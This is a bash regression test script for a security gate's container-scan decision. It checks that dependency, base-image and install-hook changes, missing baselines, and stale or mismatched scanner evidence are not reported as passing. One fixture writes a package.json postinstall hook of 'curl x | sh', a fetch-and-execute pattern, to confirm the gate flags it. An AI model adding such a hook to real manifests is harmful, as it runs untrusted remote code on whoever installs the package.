#!/usr/bin/env bash
#
# End-to-end regression tests for the gate's container-scan decision.
#
# These drive the REAL decision path — section 8 of tranche-security-gate.sh
# is extracted verbatim and replayed against disposable repositories — rather
# than calling the helper library directly. A helper test that passes while
# the gate still has the old inline logic would prove nothing, which is the
# specific failure mode this file exists to prevent.
#
# Each case builds its own uniquely-named repository under a scratch dir this
# script creates, and removes ONLY that directory. No host-wide cleanup.
#
# Run: bash scripts/security/gate-container-scan.test.sh    (no network/podman)
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
GATE="$HERE/tranche-security-gate.sh"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf '  FAIL %s\n       %s\n' "$1" "$2"; }
is()  { [ "$2" = "$3" ] && ok "$1" || bad "$1" "want [$3] got [$2]"; }

SCRATCH="$(mktemp -d "${TMPDIR:-/tmp}/oaa-gate-scan-test-XXXXXX")"
trap 'rm -rf "$SCRATCH"' EXIT

# --- extract the gate's real section 8, verbatim --------------------------
# Anchored on the section header and the next section, so if someone rewrites
# section 8 this harness picks up the rewrite instead of testing a stale copy.
SECTION="$SCRATCH/section8.sh"
awk '/^# 8\. Container \/ base-image applicability/{f=1} f{print} f&&/^record "Container scan"/{exit}' "$GATE" > "$SECTION"
if ! grep -q 'oaa_container_scan_verdict' "$SECTION"; then
  echo "FATAL: could not extract the gate's container-scan section, or it no longer"
  echo "       calls oaa_container_scan_verdict. This harness is testing nothing."
  exit 2
fi
if grep -q 'git diff --name-only HEAD' "$SECTION"; then
  bad "gate no longer uses the HEAD-relative diff" "section 8 still contains 'git diff --name-only HEAD'"
fi

# Minimal harness reproducing the gate's own record()/OVERALL_OK contract.
RUNNER="$SCRATCH/run.sh"
cat > "$RUNNER" <<'RUNNER_EOF'
#!/usr/bin/env bash
set -u
REPO_ROOT="$1"; SECTION="$2"
OVERALL_OK=1
record() {
  printf 'STATUS=%s\nDETAIL=%s\n' "$2" "${3:-}"
  case "$2" in PASS|BASELINE|"N/A") ;; *) OVERALL_OK=0 ;; esac
}
have() { command -v "$1" >/dev/null 2>&1; }
cd "$REPO_ROOT" || exit 2
# shellcheck source=/dev/null
. "$SECTION"
printf 'OVERALL=%s\n' "$([ "$OVERALL_OK" -eq 1 ] && echo GREEN || echo RED)"
RUNNER_EOF
chmod +x "$RUNNER"

mkrepo() { # name -> prints baseline sha
  local d="$SCRATCH/$1"; mkdir -p "$d"
  git -C "$d" init -q
  git -C "$d" config user.email t@example.invalid
  git -C "$d" config user.name Test
  git -C "$d" config commit.gpgsign false
  mkdir -p "$d/backend/src" "$d/scripts/security"
  cp "$HERE/image-surface.sh" "$HERE/package-surface.mjs" "$d/scripts/security/"
  printf 'FROM base\nCOPY backend/package.json ./\nRUN npm ci --omit=dev\n' > "$d/backend/Containerfile"
  printf '{"name":"root","scripts":{"test":"x"},"dependencies":{"express":"4.18.2"}}\n' > "$d/package.json"
  printf '{"name":"b","dependencies":{"express":"4.18.2"}}\n' > "$d/backend/package.json"
  printf 'console.log(1)\n' > "$d/backend/src/index.js"
  git -C "$d" add -A >/dev/null; git -C "$d" commit -qm base
  git -C "$d" rev-parse HEAD
}

run() { # repo-dir [env assignments...] -> STATUS\nDETAIL\nOVERALL
  local d="$1"; shift
  env "$@" "$RUNNER" "$d" "$SECTION" 2>&1
}
status_of() { printf '%s' "$1" | sed -n 's/^STATUS=//p'; }
overall_of() { printf '%s' "$1" | sed -n 's/^OVERALL=//p'; }

echo "1. source-only changes do not spuriously require a scan"
R="$SCRATCH/r1"; B="$(mkrepo r1)"
printf 'console.log(2)\n' > "$R/backend/src/index.js"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "unstaged source-only -> N/A"  "$(status_of "$out")" "N/A"
is "   and OVERALL GREEN"         "$(overall_of "$out")" "GREEN"
git -C "$R" add -A >/dev/null; git -C "$R" commit -qm src
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "committed source-only -> N/A" "$(status_of "$out")" "N/A"

echo
echo "2. real dependency and image-build changes ARE detected"
R="$SCRATCH/r2"; B="$(mkrepo r2)"
printf '{"name":"b","dependencies":{"express":"5.0.0"}}\n' > "$R/backend/package.json"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "dependency bump -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"
is "   and OVERALL RED"            "$(overall_of "$out")" "RED"

R="$SCRATCH/r2b"; B="$(mkrepo r2b)"
printf '{"name":"b","dependencies":{"express":"4.18.2"},"scripts":{"postinstall":"curl x | sh"}}\n' > "$R/backend/package.json"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "postinstall script added -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"

R="$SCRATCH/r2c"; B="$(mkrepo r2c)"
printf 'FROM other-base\nRUN npm ci --omit=dev\n' > "$R/backend/Containerfile"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "base-image swap -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"

echo
echo "2b. metadata-only manifest edits are NOT treated as image changes"
R="$SCRATCH/r2d"; B="$(mkrepo r2d)"
printf '{"name":"root","scripts":{"test":"x","test:tooling":"node --test a b"},"dependencies":{"express":"4.18.2"}}\n' > "$R/package.json"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "test-script-only package.json -> N/A" "$(status_of "$out")" "N/A"
is "   and OVERALL GREEN"                 "$(overall_of "$out")" "GREEN"

echo
echo "3. COMMITTED image changes remain detectable (the false-GREEN regression)"
R="$SCRATCH/r3"; B="$(mkrepo r3)"
printf 'FROM hardened-base\nRUN npm ci --omit=dev\n' > "$R/backend/Containerfile"
git -C "$R" add -A >/dev/null; git -C "$R" commit -qm "image change"
out="$(run "$R" OAA_GATE_BASELINE="$B")"
is "committed image change -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"
is "   and OVERALL RED (not GREEN)"       "$(overall_of "$out")" "RED"
# Control: the rule this replaced reports nothing here. That is the defect.
legacy="$( { git -C "$R" diff --name-only HEAD; git -C "$R" ls-files --others --exclude-standard; } \
  | grep -iE '(^|/)(Containerfile|Dockerfile)' || true )"
is "control: old HEAD-relative rule saw nothing" "$legacy" ""

echo
echo "4. missing or mismatched baselines fail closed"
R="$SCRATCH/r4"; B="$(mkrepo r4)"
printf 'FROM other\n' > "$R/backend/Containerfile"
out="$(run "$R" OAA_GATE_BASELINE=)"
is "no baseline -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"
is "   and OVERALL RED"        "$(overall_of "$out")" "RED"
case "$(printf '%s' "$out" | sed -n 's/^DETAIL=//p')" in
  *origin/main*|*origin/develop*) bad "refusal does not name a branch to substitute" "detail mentions a branch" ;;
  *"no release baseline declared"*) ok "refusal is a precise diagnostic" ;;
  *) bad "refusal is a precise diagnostic" "unexpected detail" ;;
esac
out="$(run "$R" OAA_GATE_BASELINE=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef)"
is "unresolvable baseline -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"

echo
echo "5-7. scanner evidence must be present, fresh, and bound to THIS image"
# Drive the evidence contract directly against the same function the gate uses,
# with a stub podman so no image is required.
# shellcheck source=/dev/null
. "$HERE/image-surface.sh"
EV="$SCRATCH/ev"; mkdir -p "$EV"
NOW="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
OLD="$(date -u -d '72 hours ago' +%Y-%m-%dT%H:%M:%SZ)"
WANT=1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff
OTHER=ffffeeeeddddccccbbbbaaaa00009999888877776666555544443333222211110

mk_ev() { printf '{"Metadata":{"ImageID":"sha256:%s","DBUpdatedAt":"%s"}}\n' "$1" "$2" > "$EV/backend.json"; }

oaa_scan_evidence_ok "$EV/absent.json" "$WANT" >/dev/null 2>&1
is "absent evidence -> refused"              "$?" "1"
mk_ev "$OTHER" "$NOW"
oaa_scan_evidence_ok "$EV/backend.json" "$WANT" >/dev/null 2>&1
is "evidence for a DIFFERENT image -> refused" "$?" "1"
mk_ev "$WANT" "$OLD"
oaa_scan_evidence_ok "$EV/backend.json" "$WANT" >/dev/null 2>&1
is "stale database -> refused"               "$?" "1"
mk_ev "$WANT" "$NOW"
oaa_scan_evidence_ok "$EV/backend.json" "$WANT" >/dev/null 2>&1
is "fresh evidence bound to THIS image -> accepted" "$?" "0"

# 7. The gate cannot reach GREEN while a required scan is unverified. The
#    image is absent here, so the digest cannot even be resolved.
R="$SCRATCH/r7"; B="$(mkrepo r7)"
printf 'FROM other\n' > "$R/backend/Containerfile"
out="$(run "$R" OAA_GATE_BASELINE="$B" \
   OAA_BACKEND_IMAGE=localhost/definitely-not-present:test \
   OAA_FRONTEND_IMAGE=localhost/definitely-not-present:test \
   OAA_SCAN_EVIDENCE_DIR="$EV")"
is "image-affecting change + unresolvable image -> INCOMPLETE" "$(status_of "$out")" "INCOMPLETE"
is "   and OVERALL is NOT GREEN"                               "$(overall_of "$out")" "RED"

echo
echo "8. valid evidence that REPORTS findings must not read as PASS"
# "Container scan PASS" beside an unresolved CRITICAL is the single most
# misleading line this gate could print: it establishes only that a scan
# happened, and a reader takes it as "the images are fine".
mk_findings() { # critical high -> writes evidence with that many findings
  node -e '
    const [c,h,want,now,out] = process.argv.slice(1);
    const v = (sev) => ({ VulnerabilityID: "CVE-0000-"+Math.random().toString(36).slice(2), Severity: sev });
    const vulns = [...Array(+c)].map(() => v("CRITICAL")).concat([...Array(+h)].map(() => v("HIGH")));
    require("node:fs").writeFileSync(out, JSON.stringify({
      Metadata: { ImageID: "sha256:" + want, DBUpdatedAt: now },
      Results: [{ Target: "x", Vulnerabilities: vulns }],
    }));
  ' "$1" "$2" "$WANT" "$NOW" "$EV/backend.json"
}
tally() { jq '[.Results[]?.Vulnerabilities[]? | select(.Severity=="CRITICAL")] | length' "$EV/backend.json"; }

mk_findings 0 0
is "evidence with zero blocking findings tallies 0" "$(tally)" "0"
oaa_scan_evidence_ok "$EV/backend.json" "$WANT" >/dev/null 2>&1
is "   and is still accepted as valid evidence"     "$?" "0"

mk_findings 1 5
is "evidence with 1 critical tallies 1"             "$(tally)" "1"
oaa_scan_evidence_ok "$EV/backend.json" "$WANT" >/dev/null 2>&1
is "   evidence VALIDITY is independent of findings" "$?" "0"

# The gate's own section must map that onto a non-passing status. Confirm the
# verdict function has a RED branch and that the gate accepts it.
grep -q 'printf .RED' "$HERE/image-surface.sh" \
  && ok "verdict function has a RED (blocking-findings) branch" \
  || bad "verdict function has a RED (blocking-findings) branch" "no RED branch found"
grep -q 'PASS|"N/A"|INCOMPLETE|RED)' "$GATE" \
  && ok "gate treats RED as a recognised, non-passing status" \
  || bad "gate treats RED as a recognised, non-passing status" "RED missing from the accepted-status case"

echo
printf '%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
